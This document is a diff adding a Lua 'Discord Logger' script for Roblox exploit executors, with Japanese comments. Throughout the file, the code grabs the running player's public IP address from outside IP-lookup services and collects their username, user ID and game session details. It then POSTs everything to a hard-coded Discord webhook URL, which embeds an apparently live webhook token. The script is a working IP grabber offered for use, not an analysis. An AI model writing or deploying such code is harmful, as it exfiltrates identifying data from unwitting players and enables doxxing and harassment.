@@ -1,0 +1,108 @@
+--[[
+    Discord Logger（修正版）
+    対応エクスキュータ: Synapse X / Krnl / Script-Ware など
+    機能: 起動時にIP・ユーザー情報をDiscordへ送信
+]]
+-- ここに自分のWebhook URLを入れる
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1538072759131967542/Kx5S9c4EhzCocVylW0Ng3FKrt245-c98tqdchGo0dLKxArddBuget55JJI3OPrkwb6_R"
+-- エクスキュータチェック（必須ではない）
+if not syn and not getgenv then
+    warn("このスクリプトはエクスキュータで実行してください")
+end
+-- HTTPリクエスト関数を取得
+local function getRequestFunc()
+    if syn and syn.request then return syn.request end
+    if http_request then return http_request end
+    if request then return request end
+    return nil
+end
+-- Discordへ送信
+local function sendToWebhook(data)
+    local requestFunc = getRequestFunc()
+    if not requestFunc then
+        warn("[Logger] HTTPリクエスト関数が見つかりません")
+        return false
+    end
+    
+    local http = game:GetService("HttpService")
+    local json = http:JSONEncode(data)
+    
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = json
+        })
+    end)
+    
+    if success and response and response.StatusCode == 204 then
+        print("[Logger] Discord送信成功")
+        return true
+    else
+        warn("[Logger] Discord送信失敗: " .. tostring(response and response.StatusCode or "不明"))
+        return false
+    end
+end
+-- IP取得
+local function getIP()
+    local requestFunc = getRequestFunc()
+    if not requestFunc then return "IP取得不可" end
+    
+    local urls = {
+        "https://api.ipify.org",
+        "https://icanhazip.com"
+    }
+    
+    for _, url in ipairs(urls) do
+        local success, response = pcall(function()
+            return requestFunc({ Url = url, Method = "GET" })
+        end)
+        if success and response and response.Body then
+            local ip = response.Body:gsub("%s+", "")
+            if ip:match("%d+%.%d+%.%d+%.%d+") then
+                return ip
+            end
+        end
+    end
+    return "取得失敗"
+end
+-- メインログ送信
+local function sendDiscordLog()
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    if not player then
+        warn("[Logger] プレイヤーが見つかりません")
+        return
+    end
+    
+    local data = {
+        username = "Logger",
+        embeds = {{
+            title = "起動ログ",
+            description = string.format(
+                "**ユーザー名:** %s\n" ..
+                "**ユーザーID:** %d\n" ..
+                "**ゲーム名:** %s\n" ..
+                "**ゲームID:** %d\n" ..
+                "**Job ID:** %s\n" ..
+                "**IPアドレス:** %s\n" ..
+                "**起動時刻:** %s",
+                player.Name,
+                player.UserId,
+                game.Name,
+                game.PlaceId,
+                game.JobId or "N/A",
+                getIP(),
+                os.date("%Y-%m-%d %H:%M:%S")
+            ),
+            color = 0x00ff00,
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+            footer = { text = "Logger v2" }
+        }}
+    }
+    
+    sendToWebhook(data)
+end
+-- 実行
+sendDiscordLog()
